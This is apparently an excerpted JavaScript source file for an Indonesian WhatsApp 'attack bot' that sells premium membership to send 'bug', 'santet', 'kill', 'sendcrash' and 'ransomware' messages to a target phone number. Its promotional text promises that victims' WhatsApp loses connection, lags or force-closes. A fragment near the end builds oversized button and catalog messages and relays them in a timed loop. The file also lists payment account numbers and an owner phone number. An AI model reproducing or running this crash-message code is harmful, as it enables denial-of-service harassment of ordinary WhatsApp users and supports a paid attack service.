...
global.ownerName = 'ALFIYANDEV'
global.ownerNumber = ["6281342077268@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
    ...
    owner: '*[FAILED]* Fitur Khusus Anggota Premium!',
...
jiren = ` Halo ${pushname}, Selamat datang di *BOT ATTACK WA* gunakan fitur dengan sebaik mungkin.
~️╭┬─────────────────┈ 
~️├ *「PREMIUM ONLY」*
~️├───────────────────
~️├ • ${prefix}bug (62xxx)
~️├ • ${prefix}santet (62xxx)
~️├ • ${prefix}santetv2 (62xxx)
~️├ • ${prefix}kill (62xxx)
~️├ • ${prefix}sendcrash (62xxx)
...
~️├──────────────────┈
~️├ *「JADI PREMIUM」*
~️├ >> payment : (Pengaktifan Premium)
~️├   ※ Membership : Rp 25.000
~️├──────────────────┈
*NOTE* : Harap gunakan bot dengan sewajarnya, berikan delay agar nomer bot tidak di banned.
...
case 'pay':
case 'bayar':
   byr = `Halo ${pushname}, silahkan melakukan pembayaran untuk berlangganan membership bot premium.
   *Transfer Ke :*
    • SEABANK : 901572510080
    • JAGO : 103474562146
    • OVO : 081342077268
    • LINKAJA : 081342077268
    • QRIS : ( AKTIF )
   A.N : ALIF PUTRA DARMAAAN

 Hubungi admin untuk konfirmasi pembayaran dan melakukan pengaktifan membership.
 
 © AlfiyanDev`
 diablobotwhatsapp.reply(byr)
 break
 case 'ransomware':
    {
        if (!itsMediablo) return diablobotwhatsapp.reply(`PENGEN GUNAIN BOT CHAT OWNER KIDS`)
 textnyasu = `*[SUKSES]* Bug Berhasil Terkirim ${pushname}`
...
case 'ping':
 case 'tes':
 hhh = `*BOT AKTIF !!!* Gunakan bot dengan sebaik mungkin.`
diablobotwhatsapp.reply(hhh)
break
case 'info':
  case 'Info':
case 'hai':
...
Join member Bug Santet Whatsapp!
Efect ke wa target :
- Wa tidak terdeteksi jaringan
- Lelet kirim/terima pesan/panggilan
- Force Close. Keluar sendiri tiap buka WA
- Jika simcard nya gk aktif, wa mokad

+ Unlimited kirim santet

>> *menu* : untuk liat daftar perintah bot.
>> *payment* : untuk menjadi anggota membership.
*NOTE* : Botnya jangan dispam sayang, kasih delay atau waktu. Rawan banned soalny hehee :)

_Kalo botnya ga aktif, berarti lagi off._
© AlfiyanDev`
diablobotwhatsapp.reply(bbb)
break
case 'addprem':
    if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (!args[0]) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281645xxxxxx`)
...
diablobotwhatsapp.reply(`*[SUKSES]* : Bug Berhasil Terkirim ${pushname}`)
}
break
case 'savage':
    {
...
/* templateButtons: [
{ callButton: { displayText: `BUGHARD ATTACK BOT`, phoneNumber: ``}},
{ callButton: { displayText: `BUGHARD ATTACK BOT`, phoneNumber: ``}},
{ urlButton: { displayText: `BUGHARD ATTACK BOT`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `BUGHARD ATTACK BOT`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD ATTACK BOT`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD ATTACK BOT`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD ATTACK BOT`, id: ``}},
{ quickReplyButton: { displayText: `BUGHARD ATTACK BOT`, id: ``}},
...
"businessOwnerJid": "6281645xxxxxx@s.whatsapp.net",
}
}), { userJid: from, quoted: lep  })
diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(ms(waktu))
